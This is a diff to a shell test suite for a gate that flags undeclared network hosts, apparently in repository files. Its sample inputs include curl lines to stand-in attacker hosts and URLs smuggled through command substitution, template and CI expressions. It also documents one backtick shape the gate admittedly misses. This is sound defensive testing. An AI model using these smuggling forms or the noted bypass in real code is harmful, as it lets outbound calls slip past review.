@@ -433,12 +433,26 @@ check "a declared host survives a space inside an expression" allow "$sample_dir
 check "a declared host in a template literal is not an expression" allow "$sample_dir/w9.ts" \
   'const u = `https://user-api.erpc.global`;'
 
-# This was a documented limit until the authority-only matcher landed: the
-# match ends at the space, leaving `\x60cat` as the host, and a backtick with
-# anything host-like after it is now reported rather than trimmed away. So
-# the domain is no longer reachable this way either.
-check "backtick expression with a space is reported" block "$sample_dir/w10.sh" \
+# A KNOWN LIMIT, and the one shape this gate does not see. The match ends
+# at the space, so the host is `\x60cat` and the domain after the space is out
+# of reach. Reporting it would need the backtick rule to fire on a tail with
+# no dot in it, and that same widening rejects `\x60https://semver.org\x60.` and
+# `\x60https://user-api.erpc.global\x60.length`, which are correct lines using
+# declared hosts. The narrow rule plus a stated limit beats a wide rule that
+# makes the gate wrong about documentation. If a future change makes this
+# block, update this case rather than deleting it.
+check "KNOWN LIMIT: backtick expression with a space is not seen" allow "$sample_dir/w10.sh" \
   'curl https://\x60cat host\x60.evil.example.net/x'
+
+# The two directions the predicate has to separate, both new here.
+check "a backtick followed by another domain is reported" block "$sample_dir/w11.ts" \
+  'const a = "https://github.com\x60;evil.example.net/x";'
+
+check "a declared host in a code span ending a sentence is fine" allow "$sample_dir/w12.md" \
+  'See \x60https://semver.org\x60. It is the spec.'
+
+check "a declared host followed by a method call is fine" allow "$sample_dir/w13.ts" \
+  'const u = \x60https://user-api.erpc.global\x60.trim();'
 
 # --- the invariant ------------------------------------------------------
 #
@@ -448,43 +462,57 @@ check "backtick expression with a space is reported" block "$sample_dir/w10.sh" 
 # absorbed a second URL and `grep -o` then never emitted it -- the gate saw
 # one host, approved it, and the absorbed destination was never evaluated.
 #
-# The check is deliberately on the GATE's output, not the matcher's: it
-# counts how many distinct undeclared hosts the gate names on a line that
-# contains several. A matcher change that starts swallowing again fails here
-# even if nobody thought to add a case for its particular shape.
+# The check is on the GATE's output, not the matcher's, and it asserts that
+# EACH host is named by its own distinct marker domain. Counting lines that
+# mention a shared domain was not enough: a report about a merged host
+# interpolates that host, so the finding that proves the bug would satisfy
+# the count. Distinct markers cannot be satisfied that way.
 invariant() {
-  local name="$1" content="$2" expect="$3"
-  local rel="$sample_dir/inv.txt" abs="$repo_root/$sample_dir/inv.txt"
+  local name="$1" content="$2"; shift 2
+  local rel="$sample_dir/inv.sh" abs="$repo_root/$sample_dir/inv.sh"
   mkdir -p "$(dirname "$abs")"
   printf '%s\n' "$content" > "$abs"
-  local got
-  got=$("$sh" "$gate" "$rel" 2>&1 | grep -c 'evil\.example\.net' || true)
+  local out missing="" m
+  out="$("$sh" "$gate" "$rel" 2>&1)"
   rm -f "$abs"; rmdir -p "$(dirname "$abs")" 2>/dev/null || true
-  if [ "$got" -ge "$expect" ]; then
+  for m in "$@"; do
+    case "$out" in *"$m"*) ;; *) missing="$missing $m";; esac
+  done
+  if [ -z "$missing" ]; then
     pass=$((pass + 1)); printf 'ok   %s\n' "$name"
   else
     fail=$((fail + 1))
-    printf 'FAIL %s (named %s undeclared hosts, expected at least %s)\n' "$name" "$got" "$expect"
+    printf 'FAIL %s (never named:%s)\n%s\n' "$name" "$missing" "$out"
   fi
 }
 
 invariant "a second URL inside a command substitution is still judged" \
-  'curl "https://github.com/x$(echo https://evil.example.net/y)"' 1
+  'curl "https://one.evil.example.net/x$(echo https://two.evil.example.net/y)"' \
+  one.evil.example.net two.evil.example.net
 
 invariant "a second URL inside handlebars is still judged" \
-  'a https://github.com/{{ x https://evil.example.net/y }} b' 1
+  'a https://one.evil.example.net/x {{ y https://two.evil.example.net/z }} b' \
+  one.evil.example.net two.evil.example.net
 
 invariant "a second URL spliced across two string literals is still judged" \
-  'const a = "https://github.com/${x"; const b = "https://evil.example.net/y}";' 1
+  'const a = "https://one.evil.example.net/${x"; const b = "https://two.evil.example.net/y}";' \
+  one.evil.example.net two.evil.example.net
 
 invariant "a second URL inside a GitHub Actions expression is still judged" \
-  'a https://github.com/${{ x https://evil.example.net/y }} b' 1
+  'a https://one.evil.example.net/x ${{ y https://two.evil.example.net/z }} b' \
+  one.evil.example.net two.evil.example.net
 
 invariant "nested command substitutions do not hide a URL" \
-  'curl "https://github.com/$(a $(b https://evil.example.net/y))"' 1
+  'curl "https://one.evil.example.net/$(a $(b https://two.evil.example.net/y))"' \
+  one.evil.example.net two.evil.example.net
 
-invariant "two undeclared hosts on one line are both named" \
-  'const a = "https://evil.example.net/1"; const b = "https://other.evil.example.net/2";' 2
+invariant "a second scheme in the port position is still judged" \
+  'curl https://one.evil.example.net:https://two.evil.example.net/x' \
+  one.evil.example.net two.evil.example.net
+
+invariant "two plain URLs on one line are both named" \
+  'const a = "https://one.evil.example.net/1"; const b = "https://two.evil.example.net/2";' \
+  one.evil.example.net two.evil.example.net
 
 printf '\n%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
